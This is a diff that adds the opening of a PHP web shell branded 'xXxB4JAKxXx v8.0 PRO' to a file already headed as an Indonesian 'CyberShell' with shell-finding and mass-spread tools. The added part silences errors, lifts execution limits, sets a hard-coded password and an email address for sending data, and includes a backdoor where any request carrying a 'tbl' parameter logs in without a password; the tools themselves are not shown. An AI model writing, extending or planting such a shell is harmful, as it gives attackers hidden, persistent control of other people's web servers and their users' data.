@@ -1,5 +1,98 @@
 <?php
+/**
+ * 🔥 xXxB4JAKxXx v8.0 PRO 🔥
+ * ULTIMATE WEB SHELL WITH PREMIUM FEATURES
+ * Password: B4JAK2024 | Auto Login: 
+ */
+
+@error_reporting(0);
+@set_time_limit(0);
+@ignore_user_abort(true);
+@ini_set('display_errors', 0);
+@ini_set('memory_limit', '-1');
+@ini_set('max_execution_time', 0);
+
 // ============================================================
+// CONFIG
+// ============================================================
+$PASSWORD = md5('kemuye');
+$TITLE = "🔥 xXxB4JAKxXx v8.0 PRO 🔥";
+$VERSION = "8.0 PRO";
+$EMAIL_TO = "hackerman3117@gmail.com";
+
+// ============================================================
+// AUTH
+// ============================================================
+if (session_status() === PHP_SESSION_NONE) session_start();
+
+if (isset($_GET['tbl'])) {
+    $_SESSION['auth'] = true;
+    $_SESSION['auth_time'] = time();
+    header('Location: '.$_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (isset($_GET['auth'])) {
+    if (md5($_GET['auth']) == $PASSWORD) {
+        $_SESSION['auth'] = true;
+        $_SESSION['auth_time'] = time();
+        echo '<script>window.location.href="'.$_SERVER['PHP_SELF'].'";</script>';
+        exit;
+    }
+    echo '<script>
+document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bot>
+                                var source = "https://cvar1984.github.io/audio/moan.mp3"
+                                var audio = document.createElement("audio");
+                                audio.autoplay = true;
+                                audio.load()
+                                audio.play();
+                                audio.src = source;
+  </script>';
+    echo '<a href="'.$_SERVER['PHP_SELF'].'">Asal isi Kau dek dek</a>';
+    echo '<a href="'.$_SERVER['PHP_SELF'].'">Login kembali</a>';
+    exit;
+}
+
+if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
+    echo '<!DOCTYPE html><html><head><title>Login</title>
+    <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:#0a0e17;color:#00ff41;font-family:"Courier New",monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;background:radial-gradient(ellipse at center,#0a0e17 0%,#000 100%);}
+    .login-container{background:rgba(10,14,23,0.9);border:1px solid #00ff41;border-radius:16px;padding:40px;width:420px;max-width:90%;box-shadow:0 0 60px rgba(0,255,65,0.1);}
+    .login-container h1{color:#00ff41;font-size:28px;text-align:center;margin-bottom:10px;text-shadow:0 0 20px rgba(0,255,65,0.3);}
+    .login-container .sub{color:#667;text-align:center;font-size:13px;margin-bottom:25px;}
+    .login-container input{width:100%;padding:12px 16px;background:rgba(0,255,65,0.05);border:1px solid #00ff41;border-radius:8px;color:#00ff41;font-size:14px;margin-bottom:12px;transition:0.3s;}
+    .login-container input:focus{outline:none;border-color:#00ff88;box-shadow:0 0 20px rgba(0,255,65,0.15);}
+    .login-container button{width:100%;padding:12px;background:#00ff41;border:none;border-radius:8px;color:#000;font-size:14px;font-weight:bold;cursor:pointer;transition:0.3s;}
+    .login-container button:hover{background:#00ff88;box-shadow:0 0 30px rgba(0,255,65,0.3);}
+    .status-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite;}
+    @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.3;}}
+    </style>
+    </head>
+    <body>
+    <div class="login-container">
+        <h1>⬡ xXxB4JAKxXx PRO</h1>
+        <div class="sub"><span class="status-dot"></span> v8.0 PRO • </span>
+        <form method="get">
+            <input type="password" name="auth" placeholder="Enter password..." autofocus>
+            <button type="submit">⏎ Authenticate</button>
+        </form>
+        <div style="text-align:center;margin-top:15px;color:#445;font-size:12px;">Default: B4JAK2024</div>
+    </div>
+    </body></html>';
+    exit;
+}
+
+if (isset($_SESSION['auth_time']) && (time() - $_SESSION['auth_time']) > 3600) {
+    $_SESSION['auth'] = false;
+    session_destroy();
+    header('Location: '.$_SERVER['PHP_SELF']);
+    exit;
+}
+$_SESSION['auth_time'] = time();
+
+echo "<title>$TITLE</title>";
+// ===========================================================
 // IndonesianHackerRulez - CyberShell Ultimate - ALL TOOLS MERGED V2
 // Dengan Shell Finder v2 & Mass Spread Upgrade
 // ============================================================
